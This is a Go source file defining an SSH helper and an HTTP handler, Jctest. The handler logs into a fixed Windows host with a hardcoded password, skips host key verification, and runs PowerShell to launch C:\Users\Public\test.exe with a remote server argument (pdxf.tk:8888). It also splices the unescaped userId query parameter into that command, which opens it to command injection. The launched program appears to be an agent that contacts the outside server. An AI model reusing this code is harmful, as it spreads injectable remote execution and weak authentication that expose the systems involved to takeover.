package jctest

import (
	"fmt"
	"io/ioutil"
	"log"
	"net"
	"net/http"
	"time"

	"golang.org/x/crypto/ssh"
)

// 패스워드 전달 방식과 타임아웃 전역변수 설정
const (
	CertPassword      = 1 // Using Password
	CertPublicKeyFile = 2 // USing Public Key
	DefaultTimeout    = 3 // Second
)

// SSH 접속에 필요한 정보를 담는 생성자
type SSH struct {
	IP      string
	User    string
	Cert    string //password or key file path
	Port    int
	session *ssh.Session
	client  *ssh.Client
}

func (S *SSH) readPublicKeyFile(file string) ssh.AuthMethod {
	buffer, err := ioutil.ReadFile(file)
	if err != nil {
		return nil
	}

	key, err := ssh.ParsePrivateKey(buffer)
	if err != nil {
		return nil
	}
	return ssh.PublicKeys(key)
}

// Connect the SSH Server
func (S *SSH) Connect(mode int) {
	var sshConfig *ssh.ClientConfig
	var auth []ssh.AuthMethod
	if mode == CertPassword {
		auth = []ssh.AuthMethod{
			ssh.Password(S.Cert),
		}
	} else if mode == CertPublicKeyFile {
		auth = []ssh.AuthMethod{
			S.readPublicKeyFile(S.Cert),
		}
	} else {
		log.Println("does not support mode: ", mode)
		return
	}

	sshConfig = &ssh.ClientConfig{
		User: S.User,
		Auth: auth,
		HostKeyCallback: func(hostname string, remote net.Addr, key ssh.PublicKey) error {
			return nil
		},
		Timeout: time.Second * DefaultTimeout,
	}

	client, err := ssh.Dial("tcp", fmt.Sprintf("%s:%d", S.IP, S.Port), sshConfig)
	if err != nil {
		fmt.Println(err)
		return
	}

	session, err := client.NewSession()
	if err != nil {
		fmt.Println(err)
		client.Close()
		return
	}

	S.session = session
	S.client = client
}

// RunCmd to SSH Server
func (S *SSH) RunCmd(cmd string) {
	out, err := S.session.CombinedOutput(cmd)
	if err != nil {
		fmt.Println(err)
	}
	fmt.Println(string(out))
}

// Close the SSH Server
func (S *SSH) Close() {
	S.session.Close()
	S.client.Close()
}

func Jctest(w http.ResponseWriter, r *http.Request) {
	client := &SSH{
		IP:   "192.168.122.143",
		User: "rbap",
		Port: 22,
		Cert: "asdf",
	}
	server := "http://pdxf.tk:8888"
	group := r.URL.Query().Get("userId")
	address := "'C:\\Users\\Public\\test.exe'"

	client.Connect(CertPassword)
	client.RunCmd("powershell Start-Process -FilePath " + address + " -ArgumentList '-server " + server + " -group " + group + "'; sleep(3)")
	client.Close()

	w.WriteHeader(http.StatusOK)
}
